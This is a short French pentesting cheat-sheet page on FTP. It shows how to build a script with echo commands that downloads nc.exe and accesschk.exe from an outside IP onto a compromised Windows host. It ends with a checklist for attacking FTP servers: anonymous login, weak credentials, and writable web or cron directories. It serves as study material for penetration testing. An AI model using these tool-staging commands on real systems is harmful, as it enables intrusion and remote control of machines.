---
title: FTP
permalink: /FTP/
---

# FTP

FTP non interactif
------------------

Il est possible d'utiliser FTP dans un shell non interactif en créant un fichier contenant les instructios a executer. Un exemple de fichier est le suivant:

``` bash
open 192.168.30.229
USER user
12345
bin
GET nc.exe
bye
```

Il est également possible de copier/coller les commandes suivantes pour créer ce fichier:

``` bash
echo open 192.168.30.229> ftp.txt
echo USER user>> ftp.txt
echo 12345>> ftp.txt
echo bin>> ftp.txt
echo GET accesschk.exe>> ftp.txt
echo bye>> ftp.txt
```

Enfin on execute les commandes contenues dans le fichier ftp.txt:

``` bash
ftp -v -n -s:ftp.txt
```

Exploitation
------------

Voici une liste d'éléments à vérifier face à un FTP

-   Récupérer la bannière du serveur FTP (avec [nmap](/nmap "wikilink")). Quelle est la version ? Est elle vulnérable ?
-   Peut on se logger en anonymous ? Avec quels droits ?
-   Peut on trouver un compte avec des identifiants faibles ?
-   Quels fichiers peut on trouver ?
-   Droits d'écriture ?
-   Est-il possible d'écrire dans un dossier lié à un répertoire web ?
-   Est-il possible d'écrire dans un dossier où des fichiers sont exécutés ? (ex: fichiers téléchargés par d'autres utilisateurs, scripts exécutés par un job cron, etc.)


